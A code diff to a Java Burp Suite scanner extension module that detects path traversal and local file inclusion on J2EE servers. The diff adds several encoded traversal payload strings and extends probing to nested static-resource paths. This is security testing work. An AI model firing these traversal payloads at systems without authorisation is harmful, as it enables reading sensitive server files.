@@ -3,6 +3,7 @@ package burp.j2ee.issues.impl;
 import burp.j2ee.CustomScanIssue;
 import burp.CustomHttpRequestResponse;
 import static burp.HTTPMatcher.getApplicationContext;
+import static burp.HTTPMatcher.getApplicationContextAndNestedPath;
 import burp.IBurpExtenderCallbacks;
 import burp.IExtensionHelpers;
 import burp.IHttpRequestResponse;
@@ -12,6 +13,7 @@ import burp.IScanIssue;
 import burp.IScannerInsertionPoint;
 import burp.j2ee.Confidence;
 import burp.j2ee.Risk;
+import burp.j2ee.annotation.RunOnlyOnce;
 import burp.j2ee.issues.IModule;
 
 import java.io.PrintWriter;
@@ -67,7 +69,7 @@ public class InfrastructurePathTraversal implements IModule {
             + "http://www.exploit-db.com/exploits/6229/<br />";
 
     private static final String REMEDY = "Update the remote vulnerable component";
-    
+
     private PrintWriter stderr;
     private PrintWriter stdout;
 
@@ -97,7 +99,11 @@ public class InfrastructurePathTraversal implements IModule {
             "/..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\",
             "/..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../",
             "%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2/%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2",
-            "/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c"
+            "/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c",
+            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\",
+            "/static/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f",
+            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\",
+            "....//....//....//....//....//....//....//....//"
     );
 
     private static final Map<String, Pattern> LFI_RESOURCES = new HashMap<String, Pattern>() {
@@ -107,6 +113,7 @@ public class InfrastructurePathTraversal implements IModule {
         }
     };
 
+    @RunOnlyOnce
     public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
 
         List<IScanIssue> issues = new ArrayList<>();
@@ -190,57 +197,84 @@ public class InfrastructurePathTraversal implements IModule {
          */
         String context = getApplicationContext(url);
 
+
         if (context.isEmpty()) {
             return issues;
         }
 
-        String contextURI = system + context;
+        List<String> toTest = new ArrayList();
+        toTest.add(system + "/" + context);
 
-        if (!hsc.contains(contextURI)) {
+        /**
+         *
+         * Implement basic strategies for path traversal on static resource
+         * paths (js, css)
+         *
+         * Ex: http://www.example.com/myapp/static/css/test.css
+         *
+         * Ex: http://www.example.com/myapp/static/css/{FUZZ_LFI_PAYLOADS}
+         *
+         */
+        if (url.getPath().contains(".js") || url.getPath().contains(".css")) {
+            String contextAndNestedPath = getApplicationContextAndNestedPath(url);
+            if (!contextAndNestedPath.isEmpty()) {
+                 toTest.add(system + "/" + contextAndNestedPath);
+                 stdout.println("Retrieving context path with nested static resource " + contextAndNestedPath);
 
-            hsc.add(contextURI);
+            }
+        }
 
-            // Test Local File include
-            for (String path : UTF8_LFI_PATHS) {
+        toTest.removeAll(hsc);
+        
+        if (!toTest.isEmpty()) {
 
-                Set<String> lfiOSResources = LFI_RESOURCES.keySet();
+            for (String systemPath : toTest) {
 
-                for (String osResource : lfiOSResources) {
+                String contextToTest = systemPath.substring(systemPath.indexOf('/') + 1 , systemPath.length());
 
-                    try {
+                 stdout.println("Testing  " + contextToTest);
+                 hsc.add(system + "/" + contextToTest);
+                 
+                // Test Local File include
+                for (String path : UTF8_LFI_PATHS) {
 
-                        URL urlToTest = new URL(protocol, url.getHost(), url.getPort(), context + path + osResource);
-                        byte[] utf8LFIAttempt = helpers.buildHttpRequest(urlToTest);
+                    Set<String> lfiOSResources = LFI_RESOURCES.keySet();
 
-                        byte[] responseBytes = callbacks.makeHttpRequest(url.getHost(),
-                                url.getPort(), isSSL, utf8LFIAttempt);
+                    for (String osResource : lfiOSResources) {
 
-                        IResponseInfo UTF8LFIInfo = helpers.analyzeResponse(responseBytes);
-                        String response = helpers.bytesToString(responseBytes);
+                        try {
 
-                        Pattern detectionRule = LFI_RESOURCES.get(osResource);
+                            URL urlToTest = new URL(protocol, url.getHost(), url.getPort(), contextToTest + path + osResource);
+                            byte[] utf8LFIAttempt = helpers.buildHttpRequest(urlToTest);
 
-                        Matcher matcher = detectionRule.matcher(response);
-                        if (matcher.find()) {
-                            issues.add(new CustomScanIssue(
-                                    baseRequestResponse.getHttpService(),
-                                    urlToTest,
-                                    new CustomHttpRequestResponse(utf8LFIAttempt, responseBytes, baseRequestResponse.getHttpService()),
-                                    TITLE,
-                                    DESCRIPTION,
-                                    REMEDY,
-                                    Risk.Low,
-                                    Confidence.Certain));
-                            return issues;
+                            byte[] responseBytes = callbacks.makeHttpRequest(url.getHost(),
+                                    url.getPort(), isSSL, utf8LFIAttempt);
+
+                            String response = helpers.bytesToString(responseBytes);
+
+                            Pattern detectionRule = LFI_RESOURCES.get(osResource);
+
+                            Matcher matcher = detectionRule.matcher(response);
+                            if (matcher.find()) {
+                                issues.add(new CustomScanIssue(
+                                        baseRequestResponse.getHttpService(),
+                                        urlToTest,
+                                        new CustomHttpRequestResponse(utf8LFIAttempt, responseBytes, baseRequestResponse.getHttpService()),
+                                        TITLE,
+                                        DESCRIPTION,
+                                        REMEDY,
+                                        Risk.Low,
+                                        Confidence.Certain));
+                                return issues;
+                            }
+
+                        } catch (MalformedURLException ex) {
+                            stderr.println(ex);
+                        } catch (Exception ex) {
+                            stderr.println(ex);
                         }
-
-                    } catch (MalformedURLException ex) {
-                        stderr.println(ex);
-                    } catch (Exception ex) {
-                        stderr.println(ex);
                     }
                 }
-
             }
         }
 
